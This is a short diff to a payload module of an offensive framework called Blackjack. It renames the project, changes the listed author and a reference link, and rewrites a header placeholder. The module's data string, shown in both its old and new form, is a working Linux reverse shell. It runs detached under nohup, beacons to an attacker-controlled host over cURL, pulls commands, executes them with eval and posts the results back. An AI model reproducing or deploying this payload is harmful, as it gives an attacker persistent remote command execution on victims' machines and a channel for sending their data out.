@@ -1,12 +1,12 @@
-# This module is part of the blackjack framework
+# This module is part of the Blackjack framework
 
 class Payload:
 
     info = {
-        'Title' : 'Linux cURL blackjack',
-        'Author' : 'Panagiotis Chartas (r0jahsm0ntar1)',
+        'Title' : 'Linux cURL BlackJack',
+        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
         'Description' : 'An Http based beacon-like reverse shell that utilizes cURL',
-        'References' : ['https://github.com/r0jahsm0ntar1/blackjack', 'https://revshells.com']
+        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
     }
 
     meta = {
@@ -26,4 +26,4 @@ class Payload:
 
     attrs = {}
 
-    data = 'nohup bash -c \'s=*LHOST*&&i=*SESSIONID*&&hname=$(hostname)&&p=http://;curl -s "$p$s/*VERIFY*/$hname/$USER" -H "*HOAXID*: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/*GETCMD*" -H "*HOAXID*: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/*POSTRES* -X POST -H "*HOAXID*: $i" -d "$r";echo $$;fi; fi; sleep *FREQ*; done;\' & disown'
+    data = 'nohup bash -c \'s=*LHOST*&&i=*SESSIONID*&&hname=$(hostname)&&p=http://;curl -s "$p$s/*VERIFY*/$hname/$USER" -H "*BLACKJACKID*: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/*GETCMD*" -H "*BLACKJACKID*: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/*POSTRES* -X POST -H "*BLACKJACKID*: $i" -d "$r";echo $$;fi; fi; sleep *FREQ*; done;\' & disown'
